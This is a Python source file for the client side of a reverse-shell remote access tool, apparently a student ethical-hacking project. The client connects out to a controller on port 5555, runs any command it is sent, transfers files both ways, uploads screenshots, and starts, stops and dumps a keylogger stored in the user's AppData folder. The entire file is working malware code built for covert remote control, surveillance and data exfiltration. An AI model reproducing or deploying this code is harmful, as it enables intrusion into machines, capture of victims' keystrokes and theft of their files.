import json
import socket
import subprocess
import os
import signal
import pyautogui
import multiprocessing
# #
path_keylog = os.environ['appdata'] + \
    '\\key_log.txt'  # path of the keylogger file


def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())
# #


def reliable_recv():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()


def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())
#


def screen_shot():
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save('screen.png')
#
# #
# #


def keylog_stop():
    path2 = os.environ['appdata']+'\\pid.txt'
    pid = 0
    with open(path2, "r")as p:
        pid = int(p.read())
    os.kill(pid, signal.SIGABRT)
    os.remove(path=path2)
    os.remove(path=path_keylog)


def keylog_dump():
    print("reached")
    path = os.environ['appdata']+'\\key_log.txt'
    upload_file(path)


def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'help':
            pass
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:10] == 'screenshot':
            screen_shot()
            upload_file('screen.png')
            os.remove('screen.png')
        elif command == "keylogger_start":
            subprocess.Popen(
                r'start C:\Users\basav\Desktop\eh_proj\output\keylogger.exe', shell=True)
        elif command == "keylogger_stop":
            keylog_stop()
        elif command == "keylogger_dump":
            keylog_dump()

        else:
            execute = subprocess.Popen(
                command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 5555)) # local host ip
#s.connect(('target.ip.. ', 5555))
shell()

# #
